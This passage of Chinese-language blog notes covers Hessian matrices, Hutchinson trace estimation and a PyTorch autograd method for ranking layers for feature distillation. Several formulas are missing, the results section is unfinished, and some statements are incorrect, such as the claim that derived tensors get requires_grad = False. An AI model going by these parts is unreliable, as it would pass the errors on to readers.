class="math inline">\(f(x_{1},x_{2},...,x_{n})\)</span>其表达式为: <span
class="math display">\[H_{ij} = \frac{\partial^{2}f}{\partial x_{i}
\partial x_{j}}\]</span></p>
<p>更直观的讲可以为 <img
src="https://wikimedia.org/api/rest_v1/media/math/render/svg/23f4db415be866163432946603c07edbc4a21a41" /></p>
<h4 id="hessian矩阵和泰勒展开">hessian矩阵和泰勒展开</h4>
<p>hessian矩阵和泰勒展开有一定关系，当函数为一个多元函数时，其泰勒展开中会带有与之相关的hessian矩阵。</p>
<p>当一个一元函数<span class="math inline">\(y = f(x)\)</span>在<span
class="math inline">\(x =
x_{0}\)</span>上具有任意阶导数是，在此点进行泰勒展开会有如下的表达式：
<span class="math display">\[
f(x) = f(x_{0}) + f&#39;(x_{0})\Delta x +
\frac{1}{2}f&#39;&#39;(x_{0})(\Delta x)^{2} + ...
\]</span> 其中<span class="math inline">\(\Delta x = x -
x_{0}\)</span>。</p>
<p>现在对二元函数进行展开泰勒展开：</p>
<p>仿照一元函数的形式进行整理就会发现，一元函数在二阶导数的位置处在二元函数泰勒展开中对应的是hessian矩阵。</p>
<p>推广到多元函数中，多元函数的泰勒展开可表示为：</p>
<p><a
href="https://www.zywvvd.com/notes/study/math/hessian-matrix/hessian-matrix/">参考</a></p>
<h4 id="hessian矩阵的性质">hessian矩阵的性质</h4>
<p>hessian矩阵是由二阶导数组成的，根据多元微分的理论，如果一个函数的二阶偏导数在某点连续，那么二阶偏导顺序可以交换。
<span class="math display">\[
\frac{\partial^{2}f}{\partial x_{i} \partial x_{j}} =
\frac{\partial^{2}f}{\partial x_{j} \partial x_{i}}
\]</span> 其中<span class="math inline">\(x_{i}\)</span>与<span
class="math inline">\(x_{j}\)</span>表示的是f中的变量。</p>
<p>根据hessian的形式可以知道，如果f在实数域，同时二阶偏导数连续，那么hessian将会是一个实对成矩阵。n阶实对称矩阵拥有n个正交的特征向量，所以hessian也有n个正交的特征向量。</p>
<h3 id="hessian矩阵选择迹">hessian矩阵选择迹</h3>
<p>最开始hessian矩阵的迹主要使用在多位量化中，用于给出低精度多位量化每一层位数的选择，其内部原理主要是根据每一层对于变化的敏感程度来判断的，这刚好能用在判断某一层特征的重要程度上。</p>
<p>对于一个监督学习框架，其主要目标可以定义为将损失函数的值降到最低，损失函数可以表示为：
<span class="math display">\[
L(\theta) = \frac{1}{N}\sum_{i = 1}{N}f(x_{i},y_{i},\theta)
\]</span> 其中<span
class="math inline">\(\theta\)</span>是模型中可学习权重，<span
class="math inline">\(f(x,y,\theta)\)</span>表示的是损失函数，由于当前为蒸馏层选择依据的推到，所以其中未包括本次蒸馏过程中所使用的损失函数。x表示模型的输入数据，y表示模型的输出结果，N表示的是训练集中图片的数量，假设一个神经网络可以分为L层<span
class="math inline">\({B_{1},B_{2},...B_{L}}\)</span>，这些层中对应的学习参数值为<span
class="math inline">\({W_{1},W_{2},...,W_{L}}\)</span>，假设一个batch中的数据两为<span
class="math inline">\(N_{B}\)</span>，那么一个batch中训练过程中模型参数的梯度为<span
class="math inline">\(g = \frac{1}{N_{B}} \sum_{i =
1}^{N_{B}}\frac{\partial f}{\partial
\theta}\)</span>，一个batch的训练过程中模型某一层的hessian矩阵为<span
class="math inline">\(H = \frac{1}{N_{B}} \sum_{i =
1}^{N_{B}}\frac{\partial^{2}f}{\partial \theta^{2}}\)</span>。</p>
<p>在这里先不考虑量化的问题，为方便后面的分析，假设模型是可训练的，所有网络参数和激活值都视为浮点数，不存在不可导的问题。接下来进行理论分析，研究网络中某一层发生改变之后会对整个模型造成什么影响，以确定某一层激活值的重要程度。</p>
<p>hessian能够衡量某一层变化对于损失函数的敏感程度，我们首先来简单解释下不同层的敏感程度，不同层的敏感程度主要指的是当某几层分别发生相同程度的变化，导致损失函数变化较大的层就是敏感程度较大的层。现给出结论，通过某一层参数的hessian矩阵的迹就能判断某一层的敏感程度，接下来给出理论分析：</p>
<p>首先假设当前模型存在两个条件：</p>
<ol type="1">
<li><p>模型所对应的损失函数是关于模型参数以及输入二阶可导的，并且模型所对应的损失函数已经收敛至局部最优解，这也意味着，其关于一阶与二阶的导数的相关最优解存在条件已经满足，即一阶导数为0，hessian矩阵为半正定阵。</p></li>
<li><p>由于上文说明hessian矩阵是一个实对称阵，所以<span
class="math inline">\(n\times
n\)</span>的hessian矩阵可以给出n个正交特征向量<span
class="math inline">\(v_{1},v_{2},...,v_{n}\)</span>，对于某一层参数或者某一层的激活值我们求其hessian，假设这一层参数我们加入了一些变化记作<span
class="math inline">\(\Delta
W\)</span>，这个变化我们可以使用本层hessian矩阵产生的正交的特征向量来进行表示，假设这个表示是<span
class="math inline">\(\Delta W = \sum_{i = 1}^{n}\alpha
v_{i}\)</span>。</p></li>
</ol>
<p>基于以上的假设，我们可以给出一些结论：
结论1：如果网络中两层权重或者两层激活值所加的摄动是一样的，即 <span
class="math inline">\(\| \Delta W_{1} \|\_{2}^{2} = \| \Delta W_{2}
\|\_{2}^{2}\)</span>则有当<span
class="math inline">\(\frac{1}{n_{1}}Tr(\nabla^{2}\_{W_{1}}L(W_{1}^{\*}))
&lt; \frac{1}{n_{2}}Tr(\nabla^{2}\_{W_{2}}L(W_{2}^{\*}))\)</span>时<span
class="math inline">\(L(W_{1}^{\*} + \Delta W_{1}^{\*}, W_{2}^{\*}, ...
+ W_{L}^{\*}) &lt; L(W_{1}^{\*}, W_{2}^{\*} + \Delta
W_{2}^{\*},...,W_{L}^{\*})\)</span>，网络权重或激活值变化大小同等程度下，被变化的参数的hessian的矩阵迹越小，变化程度越小。
证明如下： 设<span
class="math inline">\(W_{1}^{\*}\)</span>关于loss函数的hessian矩阵为<span
class="math inline">\(H_{1}\)</span>，其一阶导数设为<span
class="math inline">\(g_{1}\)</span>，那么当<span
class="math inline">\(W_{1}^{\*}\)</span>增加<span
class="math inline">\(\Delta
W_{1}\)</span>使用前文所说的泰勒展开可以得到如下表达： <span
class="math inline">\(L(W_{1}^{\*} + \Delta W_{1}^{\*}) = L(W_{1}^{\*})
+ g^{T}\_{1} \Delta W_{1}^{\*} + \frac{1}{2}\Delta
W_{1}^{\*T}H_{1}\Delta W_{1}^{*} = L(W_{1}^{*}) + \frac{1}{2}\Delta
W_{1}^{\*T}H_{1}\Delta W_{1}^{\*}\)</span></p>
<p>假设此时的网络已经训练收敛，即loss损失函数已经达到局部最小值点，由于此时所在的位置是极值点，那么梯度<span
class="math inline">\(g_{1}\)</span>为0，同时根据前文的推导，这里选择的摄动<span
class="math inline">\(\Delta\)</span>可使用hessian的正交向量进行表示，于是可以的出结论：
<span class="math display">\[\Delta W_{1}^{\*T}H_{1}\Delta W_{1}^{\*} =
\sum_{i = 1}^{n_{1}}\alpha_{1} v_{i}^{1T}H_{1} \alpha_{1} v_{i}^{1} =
\alpha_{1}^{2} \sum_{i = 1}^{n_{1}}\lambda_{i}^{1}\]</span></p>
<p>在这里<span
class="math inline">\(\lambda_{i}^{1}\)</span>表示相应的hessian矩阵的特征值，<span
class="math inline">\(\lambda_{i}^{1}\)</span>的特征向量为<span
class="math inline">\(v_{i}^{1}\)</span>，同样，关于<span
class="math inline">\(W_{2}\)</span>也有相关的计算： <span
class="math display">\[\Delta W_{2}^{\*T}H_{2}\Delta W_{2}^{\*} =
\alpha_{2}^{2}\sum_{i = 1}^{n_{2}}\lambda_{i}^{2}\]</span></p>
<p>因为<span class="math inline">\(W_{1}\)</span>与<span
class="math inline">\(W_{2}\)</span>同属于一个网络，所以计算的loss值中<span
class="math inline">\(L{W_{1}} = L{W_{2}}\)</span>，所以有： <span
class="math display">\[L(W_{1} + \Delta W_{1}) - L(W_{2} + \Delta W_{2})
= L(W_{1}) + \frac{1}{2} \Delta W_{1}^{T}H_{1}\Delta W_{1} - L(W_{2}) -
\frac{1}{2} \Delta W_{2}^{T}H_{1}\Delta W_{2}\]</span> <span
class="math display">\[L(W_{1} + \Delta W_{1}) - L(W_{2} + \Delta W_{2})
=\alpha_{1}^{2}\sum_{i = 1}^{n_{1}}\lambda_{i}^{1}
-  \alpha_{2}^{2}\sum_{i = 1}^{n_{2}}\lambda_{i}^{2}\]</span> 因为<span
class="math inline">\(|W_{1}|\_{2}^{2} =
|W_{2}|\_{2}^{2}\)</span>所以<span
class="math inline">\(\sqrt{n_{1}}\alpha_{1} =
\sqrt{n_{2}}\alpha_{2}\)</span>，带入上式可得：</p>
<p><span class="math display">\[
L(W_{1} + \Delta W_{1}) - L(W_{2} + \Delta W_{2}) =
\alpha_{1}^{2}(\frac{1}{n_{1}}\sum_{i = 1}^{n_{1}}\lambda_{i}^{1} -
\frac{1}{n_{2}}\sum_{i = 1}^{n_{2}}\lambda_{i}^{2})\]</span> $$</p>
<p>两个损失函数的大小与特征值之和也就是hessian的迹有关。</p>
<p>所以可以得出一个结论，在激活值接收的变化程度相同的情况下，激活值的hessian矩阵迹越大，所造成的变化越大。也就是说，迹越大，这一层参数对变化越敏感。</p>
<h4 id="hessian矩阵迹的求解">hessian矩阵迹的求解</h4>
<p>现在分析hessian矩阵迹计算的时间复杂度，假设对W求解hessian矩阵的迹，W是n维向量，则求解hessian矩阵所需时间为<span
class="math inline">\(O(n^{2})\)</span>，求解hessian的特征值有一些方法，如QR分解，Jacobi方法，Hutchinson方法这里简要分析几类方法的时间复杂度:
1.
QR方法主要通过将实对称矩阵分解为正交矩阵和上三角矩阵来求解特征值，具体来说是使用Householder变换和Givens变换逐步的迭代来达到目的，时间复杂度在<span
class="math inline">\(O(n^{3})\)</span>左右 2.
Jacobi方法是一种用于求解实对称矩阵特征值的一种方法，通过一种旋转矩阵J将目标矩阵A变为对角阵D。
<span class="math display">\[
D = (J_{1}^{T} J_{2}^{T}...J_{k}^{T}) A (J_{1}J_{2}...J_{k})
\]</span></p>
<p>现在分析时间复杂度，
由于每次旋转只会影响两行两列数据，采用顺序遍历元素的方法，最少的变换次数为<span
class="math inline">\(O(n_{2})\)</span>次，合并旋转变换矩阵的复杂度为<span
class="math inline">\(O(n)\)</span>，对于表达式<span
class="math inline">\(\|(J_{1}^{T}J_{2}^{T}...J_{k}^{T}) A
(J_{1}J_{2}...J_{k}) - diag{(J_{1}^{T}J_{2}^{T}...J_{k}^{T}) A
(J_{1}J_{2}...J_{k}})\|^{2}\_{F} &lt; \varepsilon\)</span>，<span
class="math inline">\(\varepsilon\)</span>趋近于0，当上述表达式成立的时候，表示A已经被对角化，此时可以使用阈值来判断一些元素是否需要旋转，可以将时间复杂度降下来一点，但是最坏时间复杂度依旧是<span
class="math inline">\(O(n^{3})\)</span></p>
<p>由于网络中参数数量较大，如果将网络中所有相关的参数求一遍hessian矩阵的迹会导致时间非常长，在这里可以使用近似解来代替精确解，这是一种在时间复杂度和解的准确性之间的一种平衡取舍。</p>
<ol start="3" type="1">
<li>Hutchinson迹估计方法</li>
</ol>
<p>Hutchinson迹估计方法使用了标准的蒙特卡洛方法来估计，与之相类似的还有Gaussian迹估计方法以及Rayleight-quotient迹估计方法，唯一的区别是在统计中的随机变量分不是不一样的，这里先给出结论：</p>
<p><span class="math display">\[
E(z^{T}Az) = trace(A)
\]</span> 其中A为<span class="math inline">\(n\times
n\)</span>的方阵，z为n维向量，其元素分布符合<span
class="math inline">\((P(z_{i} = \pm 1) =
\frac{1}{2})\)</span>，可见<span
class="math inline">\(z_{T}Az\)</span>是trace(A)无偏估计量。在Gaussian和Rayleight-quotient估计方法中表达式也类似，但主要区别在于z的分布不一样。下面证明这个结论：
设<span class="math inline">\(z\)</span>为符合分布<span
class="math inline">\((P(z_{i} = \pm 1) =
\frac{1}{2})\)</span>的特征向量，则有： <span class="math display">\[
z = (z_{1},z_{2},...,z_{n})^{T}
\]</span> 因为z中元素分布独立，所以有 <span class="math display">\[
E(z_{i}z{j}) = \frac{1}{4}(1 \times -1) + \frac{1}{4}(-1 \times 1) +
\frac{1}{4}(-1 \times -1) + \frac{1}{4}(1 \times 1) = 0 \\
E(z_{i}z{i}) = \frac{1}{2}(-1 \times -1) + \frac{1}{2}(1 \times 1) = 1
\]</span> 于是有 <span class="math display">\[
E(zz^{T}) = I_{n}
\]</span></p>
<p><span class="math display">\[Tr(A) = Tr(AI) = Tr(AE(zz^{T})) =
Tr(E(Azz^{T})) = E(Tr(Azz^{T}))\]</span></p>
<p>由于两个非零向量相乘所得的矩阵秩为1，所以<span
class="math inline">\(Tr(Azz^{T}) = |Azz^{T}| = |z^{T}Az| =
z^{T}Az\)</span>，所以有：</p>
<p><span class="math display">\[E(Tr(Azz^{T})) = E(z^{T}Az)\]</span>
即<span class="math inline">\(Tr(A) = E(z^{T}Az) = \frac{1}{m} \sum_{i =
1}^{m}z_{i}^{T}Az_{i}\)</span></p>
<p>于是可以使用统计的方法来完成对hessian迹的计算，时间复杂度为O(mn^{2})，其中n表示矩阵的维度，m表示迭代次数，是求解期望过程中使用的参数，时间复杂度远小于原来的情况。</p>
<p><a
href="Randomized%20algorithms%20for%20matrices%20and%20data">参考</a> <a
href="Randomized%20Algorithms%20for%20Estimating%20the%20Trace%20of%20an%20Implicit%20Symmetric%20Positive%20Semi-Definite%20Matrix">参考</a>
0. <a
href="https://blog.csdn.net/u012347027/article/details/110732488">介绍hawq2的方法</a></p>
<h3
id="hessian矩阵迹计算在代码上的实现">hessian矩阵迹计算在代码上的实现</h3>
<p>有了迹的求法，还剩一个问题就是如何在代码上实现这样的功能。由于需要计算激活值的hessian的迹，但是激活值在网络中计算一遍之后就会消失，同时反向传播的时候数据集的数据张量并不会带有相应的梯度，为了解决这两个问题，需要手动写一个能记录激活值的层，同时还要明白传入的激活值如何能让网络计算激活值的梯度，进而再去计算hessian矩阵的梯度。</p>
<ol type="1">
<li>如何记录计算过程中的激活值</li>
</ol>
<p>一个比较节约事件的方案就是使用原来开发的蒸馏框架，其可以通过修改计算图来实现中间激活值的输出，但是由于框架中蒸馏层需要指定，需要将多各层写在配置文件中，同时如果计算hessian矩阵迹的代码使用了蒸馏中的代码会导致代码耦合，后续如果对蒸馏框架升级，那么hessian矩阵迹计算代码也要进行相应修改，于是本工作采用了两个模块分开设计的思路，重新实现了一个层，包括网络中的卷积层、全连接层等常用的层，每一层中包含一个记录激活指的变量，这样后续就可以使用这个变量，计算关于激活值的hessian的迹。</p>
<ol start="2" type="1">
<li>如何计算hessian矩阵</li>
</ol>
<p>激活值记录之后就可以计算hessian矩阵了，为了能正确的计算hessian矩阵，还需要了解一下pytorch中是如何进行梯度计算的。
pytorch中的tersor在计算的时候是没有办法计算梯度的，例如，输入神经网络的输入本来相对于loss是变量，但是却没有计算梯度，主要原因在于tensor在设置时需要满足如下条件。
1.
tensor的值为浮点数，如果变量类型是定点数，那么如果变量是模型中的参数在反向传播之后更新变量会可能造成定点数变为浮点数，这样会造成一些矛盾。所以规定，所有进行梯度计算的变量类型为浮点数。
2.
tensor中选项<code>requires_grad = True</code>需要设置，因为pytorch为了节约设备的存储空间，如果不设置<code>requires_grad</code>选项，那么变量不会对梯度进行记录，加上这个设置之后，后续由其计算出的所有tensor都会是<code>requires_grad = False</code></p>
<p>所以为了求解hessian矩阵的迹，首先对于输入数据集的tensor应加上<code>requires_grad = True</code>，方便后续求解梯度。pytorch在做相关运算的时候会将得到这个变量之前使用的函数记录下来，当计算的最终结果调用了backward这个函数之后，就会根据这个函数距离去逐步调用相应的backward函数，pytorch为每一个函数都写好了导数函数，利用链式法则就可将当前变量的梯度求解出来，例如<span
class="math inline">\(y =
e^{x}\)</span>这个函数就有一个backward函数，其设置梯度为<span
class="math inline">\(e_{x}\)</span>，并与输入x的梯度相乘得到最终链式法则应有的梯度。对于一些卷积层等只需要调用相应的乘法等基本函数的梯度函数即可。</p>
<p>当然上述过程解释的是backward的计算过程，这只是一阶导数，在本工作中需要得到激活值的hessian，所以还需要进行二阶导数的计算，进行这种计算依旧要使用记录在tensor中上一步使用的函数<code>grad_fn</code>这个信息，但是无法再利用backward再次计算二阶导数，应使用torch.autograd.grad()函数，torch.autograd.grad()可以根据函数计算结果和输入变量计算最终的梯度矩阵，如果函数计算结果是一个梯度那么所求的的矩阵就是hessain矩阵。所以模型的hessian矩阵可以使用如下流程进行处理：
0. 输入张量设置<code>requires_grad = True</code> 1.
利用torch.autograd.grad()求解每一层的激活值对loss的一阶导数grads 2.
利用torch.autograd.grad()求解每层的激活值对本层激活值关于loss的一阶导数的梯度，记为hessians</p>
<ol start="3" type="1">
<li>如何进行hessian矩阵的迹的求解</li>
</ol>
<p>观察表达式</p>
<p><span class="math display">\[
Tr(A) = E(z^{T}Az) = \frac{1}{m} \sum_{i = 1}^{m}z_{i}^{T}Az_{i}
\]</span></p>
<p>发现这是个需要循环处理的函数，我们给出退出循环的两个条件 1.
上一次循环处理的结果和本次的结果之间差距小于T <span
class="math display">\[
Tr(A)\_{m} = \frac{1}{m} \sum_{i = 1}^{m}z_{i}^{T}Az_{i} \\
Tr(A)\_{m + 1} - Tr(A)\_{m} &lt; T
\]</span> 2. 循环次数已经达到上限M</p>
<p>表达式中的<span
class="math inline">\(z_{i}\)</span>可以直接使用二项分布给出相关的张量，然后将二项分布中的0改为-1，完成了分布的替换。</p>
<h3
id="如何利用hessian矩阵的迹进行蒸馏层的选择">如何利用hessian矩阵的迹进行蒸馏层的选择</h3>
<p>网络中中间层的结果就是相应网络学习到的特征，有些特征比较重要，有些特征稍微不那么重要，我们可以通过改变特征之后对网络结果的影响来判断。前面分析到，特征的hessain矩阵迹可以判断特征对损失函数大小的影响，所以可以通过计算所有层特征的hessian矩阵，使用Hutchinson统计方法统计hessian矩阵的迹，那么迹最大的几层就是特征最重要的层，所以在使用特征蒸馏方案的时候，就选择迹最大的几层，输出出来之后在配置文件中设置。</p>
<h3 id="损失函数的设置">损失函数的设置</h3>
<p>由于每一个蒸馏的特征层有不同的重要程度，所以在设置损失函数中蒸馏的损失时，其损失对应的权重应随着特征的重要程度的增加而增加。</p>
<h1 id="结果分析">结果分析</h1>
<ol type="1">
<li>lambda 设置多个</li>
<li></li>
</ol>
]]></content>
      <tags>
        <tag>quant,paper</tag>
      </tags>
  </entry>
</search>
